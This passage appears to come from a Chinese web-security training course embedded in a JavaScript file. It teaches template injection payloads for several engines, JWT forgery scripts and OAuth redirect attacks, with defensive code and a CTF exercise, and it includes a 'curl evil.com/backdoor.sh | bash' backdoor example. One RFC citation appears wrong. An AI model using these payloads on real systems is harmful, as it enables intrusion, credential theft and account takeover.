所有配置项（含密钥）\n{{request.environ}}           # 服务器环境变量\n{{self.__dict__}}             # 当前模板对象属性\n\n# === 文件读取 ===\n{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}\n# 通过子类读取：需要确定正确的索引号\n# {{''.__class__.__mro__[1].__subclasses__()[INDEX]('/etc/passwd').read()}}\n\n# === 命令执行（多种方式）===\n# 方式1: __import__ 链\n{{''.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}\n# 方式2: lipsum 全局对象\n{{lipsum.__globals__['os'].popen('id').read()}}\n# 方式3: cycler 全局对象\n{{cycler.__init__.__globals__.os.popen('id').read()}}\n# 方式4: namespace 全局对象\n{{namespace.__init__.__globals__.os.popen('id').read()}}\n\n# === 绕过黑名单技巧 ===\n# 十六进制编码绕过\n{{request|attr('\\x5f\\x5fclass\\x5f\\x5f')}}\n# GET 参数传值绕过\n{{''[request.args.k]}} 配合 &k=__class__\n# 字符串拼接绕过\n{% set c = '__cl' ~ 'ass__' %}{{''|attr(c)}}</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>在使用自动化工具时需要注意：Tplmap 的某些 Payload 可能会触发服务器端异常（500 错误），导致应用日志中出现明显的攻击痕迹。在渗透测试中应该控制请求频率，并事先获得书面授权。</p></div>\n\n<h3>Twig 模板注入</h3>\n\n<p>Twig 是 PHP 生态中最流行的模板引擎（Symfony 框架的默认引擎）。Twig 的 SSTI 利用方式与 Jinja2 类似，但语法有所不同：</p>\n\n<h4>信息收集</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\"># Twig 信息探测\n{{_self}}              # 获取当前模板信息\n{{_self.env}}           # 获取 Twig 环境对象\n{{_self.env.display('test')}}  # 测试模板渲染\n\n# 读取环境变量和全局变量\n{{_self.env.getGlobals()}}\n{{dump(_self.env)}}     # 如果 dump 函数可用\n\n# 读取 Twig 版本（帮助确定利用方式）\n{{constant('Twig\\\\Environment::VERSION')}}\n# 或者\n{{_self.env.runtime}}</code></pre></div>\n\n<h4>执行 PHP 代码</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\"># === Twig 1.x 利用方式 ===\n# 通过 registerUndefinedFilterCallback 执行系统命令\n{{_self.env.registerUndefinedFilterCallback('system')}}\n{{_self.env.getFilter('id')}}\n# 等价于执行 system('id')\n\n# 通过 registerUndefinedFunctionCallback\n{{_self.env.registerUndefinedFunctionCallback('system')}}\n{{_self.env.getFunction('id')}}\n\n# === Twig 2.x / 3.x 利用方式 ===\n# _self 不再返回 Template 对象，需要寻找替代路径\n\n# 方式一：利用 map 过滤器和回调\n{{[\"id\"]|map(\"system\")|join(\",\")}}\n# 如果 \"system\" 不被过滤，可以直接执行\n\n# 方式二：利用 filter 和回调函数\n{{[\"id\"]|filter(\"system\")}}\n\n# 方式三：通过已加载的扩展\n{{_self.env.getLoader().getSourceContext('template_name').getCode()}}\n\n# 方式四：利用 Twig 函数\n{{range(1,10)|join('')}}  # 测试基础功能\n\n# === 通用文件读取 ===\n{{'/etc/passwd'|file_excerpt(1,30)}}  # 如果函数可用\n\n# === 反序列化链（如果 Twig 有可利用的类）===\n{{['system','id']|sort('call_user_func')}}</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>Twig 2.x 对 <code>_self</code> 的行为进行了修改，不再返回 Template 对象。在 Twig 2.x 和 3.x 中，攻击者需要寻找其他的利用路径，例如通过全局函数或自定义过滤器。这意味着 Twig 的版本会直接影响利用难度。使用 <code>{{constant('Twig\\\\Environment::VERSION')}}</code> 来确认版本号是第一步。</p></div>\n\n<h3>其他模板引擎的 SSTI</h3>\n\n<p>除了 Jinja2 和 Twig，还有许多模板引擎可能存在 SSTI 漏洞。以下是几种常见引擎的利用方式：</p>\n\n<h4>Freemarker（Java）</h4>\n\n<p>Freemarker 是 Java 生态中广泛使用的模板引擎，常见于 Spring 应用和旧版 Java Web 项目：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Freemarker 信息探测\n${.version}               # 获取版本信息\n${.data_model}            # 查看数据模型\n\n# Freemarker 命令执行（需要 ?new 或 ?api 可用）\n# 方式一：通过 ?new 实例化 Java 类\n&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt;${ex(\"id\")}\n\n# 方式二：通过 ?api 调用 Java 方法（需要 api_builtin_enabled=true）\n${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}\n\n# 方式三：通过 ObjectConstructor\n&lt;#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()&gt;\n${ob(\"java.lang.Runtime\").getRuntime().exec(\"id\")}\n\n# 方式四：通过 Jython（如果 Jython 运行时可用）\n&lt;#assign value=\"freemarker.template.utility.JythonRuntime\"?new()&gt;</code></pre></div>\n\n<h4>Velocity（Java）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Velocity 信息探测\n$version                  # 版本信息\n\n# Velocity 命令执行\n# 方式一：通过 Runtime\n#set($runtime = $class.forName(\"java.lang.Runtime\").getRuntime())\n$runtime.exec(\"whoami\")\n\n# 方式二：通过 ProcessBuilder\n#set($pb = $class.forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors())\n#set($process = $pb.get(1).newInstance([[\"whoami\"]]))\n$process.start()\n\n# 方式三：如果 class 工具不可用，尝试反射\n#set($str = \"\")\n#set($class = $str.getClass().forName(\"java.lang.Runtime\"))\n#set($runtime = $class.getMethod(\"getRuntime\").invoke(null))\n$runtime.exec(\"id\")</code></pre></div>\n\n<h4>Go text/template 和 html/template</h4>\n\n<p>Go 语言的标准库包含两个模板引擎，其中 <code>text/template</code> 在处理用户输入时特别危险：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Go 模板信息探测\n{{.}}                     # 获取所有可用数据\n{{printf \"%+v\" .}}        # 详细结构信息\n\n# Go 模板的利用取决于应用传入的上下文\n# 如果传入了函数，可以直接调用\n{{call .Function \"arg1\" \"arg2\"}}\n\n# 如果能访问到系统对象，可能执行命令\n# （取决于应用代码中传递给模板的变量）\n\n# html/template 会自动转义 HTML，但不防御模板注入\n# text/template 完全不转义，更容易利用</code></pre></div>\n\n<div class=\"callout default\"><div class=\"callout-title\">模板引擎对比</div>\n<p>\n<strong>Jinja2</strong>（Python）：利用链最成熟，通过 Python 对象模型可达 RCE<br>\n<strong>Twig</strong>（PHP）：1.x 版本容易利用，2.x/3.x 需要更多技巧<br>\n<strong>Freemarker</strong>（Java）：通过 <code>?new</code> 可直接实例化 Java 类，利用较为直接<br>\n<strong>Velocity</strong>（Java）：依赖反射调用，利用链稍复杂<br>\n<strong>Go template</strong>：利用高度依赖应用代码，通用利用链较少\n</p></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h3>真实世界中的 SSTI 漏洞</h3>\n\n<h4>案例一：某电商平台的邮件模板功能</h4>\n\n<p>一家电商平台允许运营人员自定义邮件模板，模板使用 Jinja2 渲染。由于运营人员可以编辑模板内容，攻击者在获取运营人员账户后，通过邮件模板注入了恶意代码：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 邮件模板内容（被攻击者修改）\n亲爱的 {{username}}，\n\n感谢您的购买！\n\n{# 隐藏的恶意代码 #}\n{{config.__class__.__init__.__globals__['os'].popen('curl evil.com/backdoor.sh | bash').read()}}\n\n您的订单号：{{order_id}}</code></pre></div>\n\n<h4>案例二：Kubernetes Dashboard SSTI</h4>\n\n<p>Kubernetes Dashboard 的某些版本在处理错误消息时，将用户输入直接嵌入了 Go 模板（<code>text/template</code>），导致 SSTI 漏洞。攻击者可以通过构造特殊的 URL 路径注入模板代码。</p>\n\n<h4>案例三：Uber 内部工具 SSTI</h4>\n\n<p>Uber 的一个内部管理工具使用了 Python 的 Tornado 模板引擎。安全研究人员发现工具的搜索功能存在 SSTI，成功获取了内部服务器的访问权限。该漏洞被报告后获得了高额赏金。</p>\n\n<h3>防御 SSTI 攻击</h3>\n\n<h4>核心原则：永远不要将用户输入嵌入模板源码</h4>\n\n<p>SSTI 漏洞的根本原因是用户输入被当作<strong>模板代码</strong>来解析，而不是作为<strong>数据</strong>来处理。修复方法是严格区分模板和数据：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from flask import Flask, request, render_template, render_template_string\n\napp = Flask(__name__)\n\n# ❌ 错误做法：用户输入拼接到模板中\n@app.route('/welcome-bad')\ndef welcome_bad():\n    username = request.args.get('username', 'Guest')\n    template = f'&lt;h1&gt;欢迎，{username}！&lt;/h1&gt;'\n    return render_template_string(template)  # username 被当作模板代码！\n\n# ✅ 正确做法：用户输入作为模板变量传递\n@app.route('/welcome')\ndef welcome():\n    username = request.args.get('username', 'Guest')\n    # 使用模板文件，用户输入只作为变量值\n    return render_template('welcome.html', username=username)\n    # 在 welcome.html 中：&lt;h1&gt;欢迎，{{ username }}！&lt;/h1&gt;\n    # 此时 {{ username }} 的值即使包含模板语法也不会被执行\n\n# ✅ 另一种正确做法：使用 render_template_string 但传入变量\n@app.route('/welcome-alt')\ndef welcome_alt():\n    username = request.args.get('username', 'Guest')\n    template = '&lt;h1&gt;欢迎，{{ name }}！&lt;/h1&gt;'\n    return render_template_string(template, name=username)\n    # 注意：模板中的 {{ name }} 是占位符，username 的值作为数据传入</code></pre></div>\n\n<h4>使用模板引擎的沙箱模式</h4>\n\n<p>如果业务确实需要允许用户编辑模板（如邮件模板、报告模板），应使用模板引擎的沙箱功能：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from jinja2.sandbox import SandboxedEnvironment\n\n# 使用沙箱环境限制模板的能力\nenv = SandboxedEnvironment()\n\n# 沙箱会阻止访问不安全的属性和方法\ntemplate = env.from_string(user_template)\n\n# 即使模板中包含恶意代码，沙箱也会阻止执行\n# 例如 {{''.__class__.__mro__}} 会被沙箱拦截\nresult = template.render(username=username)</code></pre></div>\n\n<h4>输入过滤与输出编码</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 作为额外的防御层，对输入进行过滤\nimport re\n\ndef sanitize_template_input(user_input):\n    \"\"\"移除可能的模板注入语法\"\"\"\n    # 移除 Jinja2/Twig 模板标记\n    dangerous_patterns = [\n        r'\\{\\{.*?\\}\\}',     # {{ ... }}\n        r'\\{%.*?%\\}',       # {% ... %}\n        r'\\{#.*?#\\}',       # {# ... #}\n    ]\n    cleaned = user_input\n    for pattern in dangerous_patterns:\n        cleaned = re.sub(pattern, '', cleaned)\n    return cleaned</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">防御要点总结</div>\n<p>\n<strong>1. 分离数据与模板</strong>：用户输入只能作为模板变量的值，绝不能拼接到模板源码中<br>\n<strong>2. 使用模板文件</strong>：优先使用 <code>render_template()</code> 而非 <code>render_template_string()</code><br>\n<strong>3. 启用沙箱</strong>：如果允许用户编辑模板，必须使用沙箱环境<br>\n<strong>4. 输入过滤</strong>：作为纵深防御的一层，过滤模板语法标记<br>\n<strong>5. 最小权限</strong>：模板渲染进程应使用最低权限运行\n</p></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h3>实战练习</h3>\n\n<p>通过以下挑战巩固你对 SSTI 攻击的理解：</p>\n\n<ul>\n<li>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF('ctf-012')\"><span class=\"arrow\">▶</span> CTF挑战: 模板迷宫</button>\n<p>目标：CyberShop 的个性化贺卡功能存在 SSTI 漏洞。你需要识别模板引擎类型，构造利用链读取服务器上的 flag.txt 文件。提示：注意模板引擎的过滤器和黑名单绕过。</p>\n</li>\n</ul>\n\n<div class=\"callout info\"><div class=\"callout-title\">学习建议</div><p>建议在本地使用 Flask 搭建一个简单的 SSTI 靶场来练习。从最简单的 <code>{{config}}</code> 开始，逐步尝试完整的 RCE 利用链。重点理解 Python 对象模型中的 <code>__class__</code>、<code>__mro__</code>、<code>__subclasses__()</code> 链是如何工作的，这将帮助你举一反三地利用其他模板引擎的 SSTI 漏洞。</p></div>\n\n---SECTION_BREAK---\n\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["web-08-01"] = "<!-- ============================================================= -->\n\n<div class=\"section-transition\"><p>前面几章我们一直在攻击应用的功能逻辑。现在让我们换一个角度——直接攻击应用的<strong>认证系统</strong>。JWT（JSON Web Token）和 OAuth 是现代 Web 应用最常用的认证机制，它们的实现中往往隐藏着严重的安全漏洞。</p></div>\n\n<h2>JWT/OAuth 认证安全</h2>\n<p><strong>主题：伪造身份——破解认证的艺术</strong></p>\n\n<p>CyberShop 使用 JWT（JSON Web Token）来保护其 API 接口。用户登录后，服务器返回一个 JWT Token，之后的每次 API 请求都携带这个 Token 来证明身份。如果攻击者能够伪造或篡改 JWT Token，就能冒充任何用户——包括管理员——来访问系统的所有功能。</p>\n\n<h3>JWT 的工作原理</h3>\n\n<p>JWT 是一个由三段 Base64 编码的字符串通过点号（<code>.</code>）连接而成的令牌，格式为 <code>header.payload.signature</code>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 一个典型的 JWT Token\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0LCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n# 拆解成三部分（用 . 分隔）：\n# 第一部分 (Header):    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n# 第二部分 (Payload):    eyJ1c2VyX2lkIjoxMjM0LCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0\n# 第三部分 (Signature):  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre></div>\n\n<h4>JWT 结构详解</h4>\n\n<p>对每一部分进行 Base64 解码，可以看到实际内容：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 解码 Header（声明算法和类型）\necho \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\" | base64 -d\n# 结果: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n# alg: 签名算法（这里是 HMAC-SHA256）\n# typ: Token 类型\n\n# 解码 Payload（携带用户数据）\necho \"eyJ1c2VyX2lkIjoxMjM0LCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0\" | base64 -d\n# 结果: {\"user_id\":1234,\"role\":\"user\",\"iat\":1700000000}\n# 注意：Payload 中包含的信息称为 \"Claims\"（声明）\n# iat: 签发时间（issued at）\n\n# Signature 无法直接\"解码\"——它是用密钥计算出来的签名\n# 计算方式: HMAC-SHA256(base64url(header) + \".\" + base64url(payload), secret_key)</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>JWT 的 Header 和 Payload 只是 Base64 编码，<strong>不是加密</strong>。任何人都可以解码并读取其中的内容。JWT 的安全性依赖于 Signature（签名）——它保证了 Token 的内容未被篡改。但如果签名验证存在缺陷，攻击者就能伪造任意 Token。</p></div>\n\n<h4>JWT 认证流程</h4>\n\n<p>CyberShop 的 JWT 认证流程如下：</p>\n\n<ol>\n<li><strong>登录</strong>：用户提交用户名和密码 → 服务器验证通过后生成 JWT → 返回给客户端</li>\n<li><strong>请求</strong>：客户端在 HTTP 请求头中携带 JWT：<code>Authorization: Bearer &lt;token&gt;</code></li>\n<li><strong>验证</strong>：服务器验证 JWT 的签名 → 解码 Payload → 根据用户信息处理请求</li>\n</ol>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import jwt\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\nSECRET_KEY = \"cybershop_secret_2024\"  # 签名密钥\n\n# 登录接口：生成 JWT\n@app.route('/api/login', methods=['POST'])\ndef login():\n    data = request.get_json()\n    user = authenticate(data['username'], data['password'])\n    if user:\n        token = jwt.encode({\n            \"user_id\": user.id,\n            \"role\": user.role,     # \"user\" 或 \"admin\"\n            \"exp\": datetime.utcnow() + timedelta(hours=24)\n        }, SECRET_KEY, algorithm=\"HS256\")\n        return jsonify({\"token\": token})\n    return jsonify({\"error\": \"Invalid credentials\"}), 401\n\n# API 接口：验证 JWT\n@app.route('/api/admin/users', methods=['GET'])\ndef admin_users():\n    token = request.headers.get('Authorization', '').replace('Bearer ', '')\n    try:\n        payload = jwt.decode(token, SECRET_KEY, algorithms=[\"HS256\"])\n        if payload['role'] != 'admin':\n            return jsonify({\"error\": \"Permission denied\"}), 403\n        return jsonify(get_all_users())\n    except jwt.InvalidTokenError:\n        return jsonify({\"error\": \"Invalid token\"}), 401</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>JWT 攻击方式</h3>\n\n<p>尽管 JWT 的设计本身是安全的，但在实际实现中经常出现可被利用的漏洞。以下是三种最常见的 JWT 攻击方式：</p>\n\n<h4>攻击一：算法混淆（Algorithm Confusion）</h4>\n\n<p>这是最经典的 JWT 攻击。当服务器同时支持对称加密（HS256）和非对称加密（RS256）时，攻击者可以利用算法混淆来伪造 Token。</p>\n\n<p><strong>原理</strong>：</p>\n<ul>\n<li><strong>RS256</strong>：使用 RSA 密钥对——私钥签名，公钥验证。公钥是公开的</li>\n<li><strong>HS256</strong>：使用同一个密钥进行签名和验证</li>\n<li>如果服务器根据 JWT Header 中的 <code>alg</code> 字段来选择验证算法，攻击者可以将 <code>alg</code> 从 <code>RS256</code> 改为 <code>HS256</code>，然后用 RSA 公钥作为 HMAC 密钥来签名</li>\n</ul>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import jwt\nimport json\nimport base64\n\n# 步骤一：获取服务器的 RSA 公钥\n# 公钥通常可以从 /api/jwks 或 /.well-known/jwks.json 获取\nrsa_public_key = open('server_public_key.pem', 'r').read()\n\n# 步骤二：构造恶意 JWT\nheader = {\n    \"alg\": \"HS256\",     # 将算法从 RS256 改为 HS256\n    \"typ\": \"JWT\"\n}\n\npayload = {\n    \"user_id\": 1,\n    \"role\": \"admin\",    # 将自己提升为管理员\n    \"exp\": 9999999999\n}\n\n# 步骤三：用 RSA 公钥作为 HMAC 密钥签名\n# 如果服务器用 RS256 的公钥来验证 HS256 签名，就会通过！\nforged_token = jwt.encode(\n    payload,\n    rsa_public_key,     # 用公钥作为 HMAC 密钥\n    algorithm=\"HS256\",  # 声明使用 HS256\n    headers=header\n)\n\nprint(f\"伪造的 Token: {forged_token}\")\n# 服务器验证时使用公钥做 HMAC-SHA256 → 签名匹配 → 验证通过！</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>这个攻击要求服务器端代码根据 JWT Header 中的 <code>alg</code> 字段动态选择验证算法。现代的 JWT 库（如 PyJWT 2.0+）默认不会这样做——它们要求开发者在验证时<strong>明确指定</strong>允许的算法列表。但如果开发者使用了 <code>algorithms=None</code> 或 <code>verify=False</code>，就会重新引入这个漏洞。</p></div>\n\n<h4>攻击二：\"none\" 算法攻击</h4>\n\n<p>JWT 规范中定义了一个特殊的算法 <code>\"none\"</code>，表示不使用任何签名。这个设计初衷是用于已经通过其他方式（如 TLS）保证了完整性的场景，但很多 JWT 库错误地接受了它：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import base64\nimport json\n\n# 构造一个使用 \"none\" 算法的 JWT\nheader = {\"alg\": \"none\", \"typ\": \"JWT\"}\npayload = {\"user_id\": 1, \"role\": \"admin\", \"exp\": 9999999999}\n\n# Base64URL 编码\ndef b64url_encode(data):\n    return base64.urlsafe_b64encode(\n        json.dumps(data).encode()\n    ).rstrip(b'=').decode()\n\nheader_b64 = b64url_encode(header)\npayload_b64 = b64url_encode(payload)\n\n# \"none\" 算法的 JWT 签名部分为空\nforged_token = f\"{header_b64}.{payload_b64}.\"\n# 注意末尾的点号——签名为空字符串\n\nprint(f\"伪造的 Token: {forged_token}\")\n\n# 变体：有些过滤器只检查小写 \"none\"\n# 尝试大小写变体绕过\nfor alg in [\"none\", \"None\", \"NONE\", \"nOnE\"]:\n    header = {\"alg\": alg, \"typ\": \"JWT\"}\n    token = f\"{b64url_encode(header)}.{payload_b64}.\"\n    # 逐个尝试</code></pre></div>\n\n<h4>攻击三：弱密钥暴力破解</h4>\n\n<p>如果服务器使用 HS256 算法并且密钥强度不够，攻击者可以离线暴力破解密钥：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 hashcat 暴力破解 JWT 密钥\n# 模式 16500 专门用于 JWT 破解\nhashcat -m 16500 -a 0 jwt_token.txt rockyou.txt\n\n# 使用 jwt_tool 破解弱密钥\npython3 jwt_tool.py eyJhbGci...token...here -C -d wordlist.txt\n\n# 使用 john the ripper\njohn jwt_token.txt --wordlist=rockyou.txt\n\n# 常见的弱密钥示例：\n# \"secret\", \"password\", \"123456\", \"key\", \"jwt_secret\"\n# \"cybershop\", \"admin\", \"changeme\", \"test\"\n# 如果密钥在这些字典中，几秒钟就能破解</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 破解密钥后，用该密钥伪造任意 Token\nimport jwt\n\ncracked_secret = \"cybershop\"  # 通过暴力破解获得的密钥\n\nforged_token = jwt.encode(\n    {\"user_id\": 1, \"role\": \"admin\", \"exp\": 9999999999},\n    cracked_secret,\n    algorithm=\"HS256\"\n)\n\n# 现在可以以管理员身份访问所有 API！\nprint(f\"管理员 Token: {forged_token}\")</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h4>实战：使用 jwt_tool 进行 JWT 攻击</h4>\n\n<p><strong>jwt_tool</strong> 是一个功能强大的 JWT 安全测试工具，集成了多种攻击模式：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 安装 jwt_tool\ngit clone https://github.com/ticarpi/jwt_tool.git\ncd jwt_tool\npip install -r requirements.txt\n\n# 基本用法：解析 JWT Token\npython3 jwt_tool.py eyJhbGciOi...\n\n# 攻击模式一：算法混淆（RS256 → HS256）\npython3 jwt_tool.py eyJhbGciOi... -X k -pk server_public.pem\n\n# 攻击模式二：\"none\" 算法注入\npython3 jwt_tool.py eyJhbGciOi... -X a\n\n# 攻击模式三：暴力破解密钥\npython3 jwt_tool.py eyJhbGciOi... -C -d /usr/share/wordlists/rockyou.txt\n\n# 攻击模式四：篡改 Payload\npython3 jwt_tool.py eyJhbGciOi... -T -S hs256 -p \"secret_key\"\n\n# 交互式模式（推荐新手使用）\npython3 jwt_tool.py eyJhbGciOi... -M at\n# 进入交互菜单，可以逐步尝试各种攻击</code></pre></div>\n\n<h4>其他 JWT 攻击方式</h4>\n\n<ul>\n<li><strong>JKU/X5U 头部注入</strong>：如果 JWT 的 Header 中包含 <code>jku</code>（JWK Set URL）字段，服务器会从该 URL 获取公钥。攻击者可以将 <code>jku</code> 指向自己控制的服务器，提供自己的公钥</li>\n<li><strong>KID 参数注入</strong>：<code>kid</code>（Key ID）用于指定使用哪个密钥。如果 <code>kid</code> 被直接用于数据库查询或文件路径拼接，可能导致 SQL 注入或目录遍历</li>\n<li><strong>Token 过期验证缺失</strong>：如果服务器不检查 <code>exp</code>（过期时间）声明，泄露的 Token 将永久有效</li>\n</ul>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># JKU 头部注入示例\nimport jwt\nimport json\n\n# 攻击者在自己的服务器上放置恶意 JWKS\n# https://evil.com/jwks.json → 包含攻击者的 RSA 公钥\n\nheader = {\n    \"alg\": \"RS256\",\n    \"typ\": \"JWT\",\n    \"jku\": \"https://evil.com/jwks.json\"  # 指向攻击者控制的密钥服务器\n}\n\npayload = {\n    \"user_id\": 1,\n    \"role\": \"admin\"\n}\n\n# 用攻击者的私钥签名\nforged_token = jwt.encode(payload, attacker_private_key,\n                          algorithm=\"RS256\", headers=header)\n\n# 如果服务器信任 jku 字段并从 evil.com 获取公钥\n# → 用攻击者的公钥验证 → 签名通过 → 攻击成功！</code></pre></div>\n\n<h3>OAuth 2.0 安全</h3>\n\n<p>OAuth 2.0 是另一种广泛使用的授权框架，它允许用户通过第三方服务（如 Google、GitHub、微信）登录应用。CyberShop 支持\"使用 GitHub 账号登录\"功能，这正是 OAuth 2.0 的典型应用。</p>\n\n<h4>OAuth 2.0 授权码流程</h4>\n\n<p>OAuth 2.0 的授权码流程（Authorization Code Flow）是最安全的流程，步骤如下：</p>\n\n<ol>\n<li><strong>用户点击\"GitHub 登录\"</strong> → CyberShop 将用户重定向到 GitHub 的授权页面</li>\n<li><strong>用户在 GitHub 上授权</strong> → GitHub 将用户重定向回 CyberShop，附带一个临时授权码（code）</li>\n<li><strong>CyberShop 服务器用授权码换取 Access Token</strong> → 服务器直接与 GitHub API 通信</li>\n<li><strong>使用 Access Token 获取用户信息</strong> → 完成登录</li>\n</ol>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 步骤一：重定向到 GitHub 授权页面\nhttps://github.com/login/oauth/authorize?\n  client_id=cybershop_client_id&\n  redirect_uri=https://cybershop.com/oauth/callback&\n  scope=user:email&\n  state=random_csrf_token_here    # 防止 CSRF 攻击\n\n# 步骤二：用户授权后，GitHub 重定向回 CyberShop\nhttps://cybershop.com/oauth/callback?\n  code=TEMP_AUTH_CODE_abc123&\n  state=random_csrf_token_here\n\n# 步骤三：CyberShop 服务器用 code 换取 Access Token\ncurl -X POST https://github.com/login/oauth/access_token \\\n  -d \"client_id=cybershop_client_id\" \\\n  -d \"client_secret=cybershop_client_secret\" \\\n  -d \"code=TEMP_AUTH_CODE_abc123\"\n# 返回: access_token=gho_xxxx&token_type=bearer\n\n# 步骤四：用 Access Token 获取用户信息\ncurl -H \"Authorization: token gho_xxxx\" \\\n  https://api.github.com/user</code></pre></div>\n\n<h4>OAuth 2.0 常见漏洞</h4>\n\n<p><strong>漏洞一：redirect_uri 操控</strong></p>\n\n<p>如果 OAuth 服务没有严格验证 <code>redirect_uri</code>，攻击者可以将其改为自己的服务器：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 正常请求\nhttps://github.com/login/oauth/authorize?\n  client_id=cybershop_client_id&\n  redirect_uri=https://cybershop.com/oauth/callback&\n  state=abc123\n\n# 攻击：修改 redirect_uri 到攻击者的服务器\nhttps://github.com/login/oauth/authorize?\n  client_id=cybershop_client_id&\n  redirect_uri=https://evil.com/steal&     # 改为攻击者的服务器\n  state=abc123\n\n# 如果 GitHub 没有严格校验 redirect_uri\n# 用户授权后，授权码会被发送到 evil.com\n# 攻击者可以用这个授权码获取用户的 Access Token！\n\n# 绕过 redirect_uri 校验的技巧：\n# 1. URL 路径差异: redirect_uri=https://cybershop.com/oauth/callback/../evil\n# 2. 子域名利用:  redirect_uri=https://evil.cybershop.com/callback\n# 3. URL 编码:     redirect_uri=https://cybershop.com/oauth/callback%40evil.com\n# 4. 开放重定向:   redirect_uri=https://cybershop.com/redirect?url=https://evil.com</code></pre></div>\n\n<p><strong>漏洞二：State 参数缺失（CSRF 攻击）</strong></p>\n\n<p><code>state</code> 参数用于防止 CSRF 攻击。如果省略了 <code>state</code>，攻击者可以将自己的 OAuth 授权绑定到受害者的账户上：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># CSRF 攻击场景（缺少 state 参数）：\n\n# 1. 攻击者用自己的 GitHub 账号发起 OAuth 请求，获得授权码\n# https://github.com/login/oauth/authorize?client_id=xxx&redirect_uri=xxx\n# → 获得: code=ATTACKER_CODE\n\n# 2. 攻击者将带有自己授权码的回调 URL 发送给受害者\n# https://cybershop.com/oauth/callback?code=ATTACKER_CODE\n\n# 3. 受害者点击链接（或被骗访问该 URL）\n# → CyberShop 用 ATTACKER_CODE 换取 Access Token\n# → 攻击者的 GitHub 账号被关联到受害者的 CyberShop 账户\n# → 攻击者之后可以用自己的 GitHub 账号登录受害者的 CyberShop 账户！</code></pre></div>\n\n<p><strong>漏洞三：Access Token 泄露</strong></p>\n\n<p>在隐式授权流程（Implicit Flow）中，Access Token 直接通过 URL 的 Fragment（<code>#</code> 部分）传递，容易被泄露：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 隐式流程的回调 URL（Access Token 在 Fragment 中）\nhttps://cybershop.com/oauth/callback#access_token=gho_xxxx&token_type=bearer\n\n# 泄露途径：\n# 1. 浏览器历史记录中会记录完整的 URL\n# 2. 如果页面包含外部资源（图片、脚本），Referrer 头可能泄露 URL\n# 3. 代理服务器和日志可能记录完整的 URL\n# 4. 浏览器插件可以读取当前 URL</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>OAuth 2.0 的最新最佳实践（RFC 9126）强烈建议：始终使用授权码流程（Authorization Code Flow）+ PKCE，避免使用隐式流程（Implicit Flow）。PKCE（Proof Key for Code Exchange）通过动态生成的验证码来防止授权码拦截攻击。</p></div>\n\n<h3>防御认证系统漏洞</h3>\n\n<h4>JWT 安全最佳实践</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># ✅ JWT 安全实现示例\n\nimport jwt\nimport secrets\nfrom datetime import datetime, timedelta\n\n# 1. 